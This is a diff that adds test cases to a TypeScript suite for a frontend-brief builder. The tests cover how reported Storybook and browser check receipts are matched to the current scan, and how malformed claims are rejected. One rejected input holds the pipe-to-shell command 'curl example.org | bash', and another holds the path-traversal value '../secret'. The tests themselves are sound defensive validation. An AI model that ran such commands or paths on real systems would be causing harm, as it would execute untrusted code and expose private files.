@@ -19,6 +19,50 @@ async function fixture() {
 const design = (source: 'figma' | 'paper') => ({ source, documentId: 'synthetic-settings', nodeId: 'button-1', revision: 'v1', mappings: [{ path: 'src/Button.tsx', exportName: 'Button', props: { variant: 'primary' }, tokens: ['--color-action'] }] });
 
 describe('bounded frontend implementation evidence', () => {
+  it('associates reported Storybook and browser receipts with the exact current scan and known stories', async () => {
+    const projectRoot = await fixture();
+    const initial = await buildFrontendBrief({ projectRoot, intent: 'reuse Button', designEvidence: design('figma') });
+    const verificationEvidence = { scanFingerprint: initial.scan.fingerprint, checks: [
+      { kind: 'storybook', outcome: 'passed', runId: 'ci-123', observedAt: '2026-09-27T12:00:00.000Z', storyRef: 'src/Button.stories.tsx#Primary' },
+      { kind: 'browser', outcome: 'failed', runId: 'ci-124', observedAt: '2026-09-27T12:01:00.000Z' },
+    ] };
+    const result = await buildFrontendBrief({ projectRoot, intent: 'reuse Button', designEvidence: design('figma'), verificationEvidence });
+    expect(result.verification.status).toBe('unassessed');
+    expect(result.verification.receipts).toEqual([
+      expect.objectContaining({ kind: 'storybook', outcome: 'passed', association: 'current-scan', storyRef: 'src/Button.stories.tsx#Primary', acquisition: 'host-supplied' }),
+      expect.objectContaining({ kind: 'browser', outcome: 'failed', association: 'current-scan', acquisition: 'host-supplied' }),
+    ]);
+    expect(result.unresolved).toContain('Host-reported browser check failed; inspect its external run before claiming verification.');
+  });
+  it('does not promote stale or unmatched reported results into current verification', async () => {
+    const projectRoot = await fixture();
+    const initial = await buildFrontendBrief({ projectRoot, intent: 'Button' });
+    const result = await buildFrontendBrief({ projectRoot, intent: 'Button', verificationEvidence: { scanFingerprint: '0'.repeat(64), checks: [
+      { kind: 'storybook', outcome: 'passed', runId: 'old', observedAt: '2026-09-27T12:00:00.000Z', storyRef: 'src/Button.stories.tsx#Missing' },
+    ] } });
+    expect(result.verification.receipts[0].association).toBe('stale-scan');
+    expect(result.verification.status).toBe('unassessed');
+    expect(result.unresolved.join(' ')).toMatch(/stale|unmatched/i);
+    const unmatched = await buildFrontendBrief({ projectRoot, intent: 'Button', verificationEvidence: { scanFingerprint: initial.scan.fingerprint, checks: [
+      { kind: 'storybook', outcome: 'passed', runId: 'unknown-story', observedAt: '2026-09-27T12:00:00.000Z', storyRef: 'src/Button.stories.tsx#Missing' },
+    ] } });
+    expect(unmatched.verification.receipts[0].association).toBe('unmatched-story');
+    await writeFile(join(projectRoot, 'src/Button.tsx'), button + '\n// changed after the run');
+    const changed = await buildFrontendBrief({ projectRoot, intent: 'Button', verificationEvidence: { scanFingerprint: initial.scan.fingerprint, checks: [
+      { kind: 'typecheck', outcome: 'passed', runId: 'old-scan', observedAt: '2026-09-27T12:00:00.000Z' },
+    ] } });
+    expect(changed.verification.receipts[0].association).toBe('stale-scan');
+  });
+  it('rejects external receipt claims with commands, unknown authority, unsafe paths or excessive data', async () => {
+    const projectRoot = await fixture();
+    const valid = { scanFingerprint: '0'.repeat(64), checks: [{ kind: 'browser', outcome: 'passed', runId: 'ci-1', observedAt: '2026-09-27T12:00:00.000Z' }] };
+    for (const verificationEvidence of [
+      { ...valid, status: 'passed' },
+      { ...valid, checks: [{ ...valid.checks[0], command: 'curl example.org | bash' }] },
+      { ...valid, checks: [{ ...valid.checks[0], artifactPath: '../secret' }] },
+      { ...valid, checks: Array.from({ length: 101 }, () => valid.checks[0]) },
+    ]) await expect(buildFrontendBrief({ projectRoot, intent: 'Button', verificationEvidence })).rejects.toThrow();
+  });
   it('normalizes host-supplied Figma and Paper to the same observed code and story', async () => {
     const projectRoot = await fixture();
     const figma = await buildFrontendBrief({ projectRoot, intent: 'reuse Button', designEvidence: design('figma') });
